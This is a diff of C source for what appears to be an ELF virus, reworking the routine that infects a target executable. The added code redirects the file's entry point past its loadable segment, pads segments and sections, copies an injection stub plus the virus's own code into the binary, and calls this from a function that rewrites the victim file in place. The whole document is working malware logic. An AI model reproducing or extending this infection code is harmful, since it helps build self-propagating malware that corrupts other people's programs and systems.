@@ -41,6 +41,7 @@ void	add_injection(void **dst, t_elf *elf, uint64_t entry_inject, uint64_t entry
 	*dst += sizeof(uint64_t) * 4;
 }
 
+/*
 void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 {
 	uint64_t	new_entry;
@@ -71,6 +72,40 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	// TODO: fix for thin files like inject
 	src += (virus_elf->size + INJECT_SIZE) - get_size_needed(elf, virus_elf);
 	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
+	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
+}
+*/
+
+void	create_infection(void *dst, t_elf *elf, int nb_zero)
+{
+	uint64_t	new_entry;
+	uint64_t	entry_infect;
+	void		*src;
+	void		*end;
+
+	src = elf->addr;
+	end = src + elf->size;
+	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
+	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
+	src = &elf->header->e_entry;
+	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz;
+	entry_infect = elf->pt_load->p_offset + elf->pt_load->p_filesz + INJECT_SIZE;
+	ft_memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
+	dst += sizeof(elf->header->e_entry);
+	src += sizeof(elf->header->e_entry);
+	src = add_padding_segments(elf, src, &dst, nb_zero);
+	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
+	ft_memcpy(dst, src, pt_load_size_left);
+	dst += pt_load_size_left;
+	src += pt_load_size_left;
+	add_injection(&dst, elf, new_entry, entry_infect);
+	dst += INJECT_SIZE;
+	ft_memcpy(dst, infect, ((intptr_t)_start - (intptr_t)infect));
+	dst += (intptr_t)_start - (intptr_t)infect;
+	ft_memset(dst, 0, nb_zero);
+	dst += nb_zero;
+	src += ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE;
+	src = add_padding_sections(elf, src, &dst, nb_zero);
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
@@ -129,6 +164,7 @@ void	infect_file(char *file)
 						#endif
 						return ;
 					}
+					create_infection(new, &elf, nb_zero_to_add);
 					syscall_munmap(elf.addr, elf.size);
 					syscall_close(fd);
 					fd = syscall_open(file, O_TRUNC | O_WRONLY);
